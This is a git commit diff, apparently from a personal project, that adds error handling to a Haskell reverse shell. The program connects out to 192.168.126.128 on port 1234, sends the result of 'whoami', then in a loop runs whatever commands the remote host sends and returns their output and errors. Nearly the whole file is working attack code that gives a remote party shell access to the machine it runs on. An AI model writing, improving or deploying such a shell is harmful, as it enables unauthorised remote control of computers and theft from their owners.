19b36a2026a7173e3ac591d6a29c669b8661df62
unknown <joshua.n.magri@gmail.com>
2020-05-28 16:32:28 -0500

    Implemented error handling

--- reverse-shell.hs
+++ reverse-shell.hs
@@ -3,7 +3,7 @@ import Network.Socket.ByteString (send, recv)
 import qualified Data.ByteString.Char8 as B8
 import System.Process
 import System.IO
-import Data.List.Split
+import Control.Exception
 
 main = do
         client "192.168.126.128" 1234
@@ -14,21 +14,38 @@ client host port = withSocketsDo $ do
                 let serverAddr = head addrInfo
                 sock <- socket (addrFamily serverAddr) Stream defaultProtocol
                 connect sock (addrAddress serverAddr)
-                (_, Just hout, _, _) <- createProcess (proc "id" []) {std_out = CreatePipe}
+                (_, Just hout, _, _) <- createProcess (proc "whoami" []) {std_out = CreatePipe}
                 resultOut <- hGetContents hout
                 let resultMsg = B8.pack resultOut
                 send sock resultMsg
                 msgSender sock
-                sClose sock
+                close sock
 
 msgSender :: Socket -> IO ()
 msgSender sock = do
   let msg = B8.pack ""
   send sock msg
   rMsg <- recv sock 1024
-  let split_cmd = splitOn " " (filter (/= '\n') (B8.unpack rMsg))
-  (_, Just hout, _, _) <- createProcess (proc (head split_cmd) (tail split_cmd)) {std_out = CreatePipe}
-  resultOut <- hGetContents hout
-  let resultMsg = B8.pack resultOut
-  send sock resultMsg
+  let split_cmd = words (filter (/= '\n') (B8.unpack rMsg))
+  result <- try' $ createProcess (proc (head split_cmd) (tail split_cmd)) {std_out = CreatePipe, std_err = CreatePipe}
+  case result of 
+    Left ex                            -> sendError sock ex
+    Right (_, Just hout, Just herr, _) -> sendResult sock (Nothing, Just hout, Just herr, Nothing)
   msgSender sock
+  
+ 
+try' :: IO a -> IO (Either IOException a)
+try' = try
+
+sendError sock err = do
+  let errorMsg = B8.pack ("Error:" ++ show err ++ "\n")
+  send sock errorMsg
+  
+sendResult sock (_, Just hout, Just herr, _) = do
+    resultOut <- hGetContents hout
+    errorOut <- hGetContents herr
+    let resultMsg = B8.pack resultOut
+    let errorMsg = B8.pack errorOut
+    send sock resultMsg
+    send sock errorMsg
+  
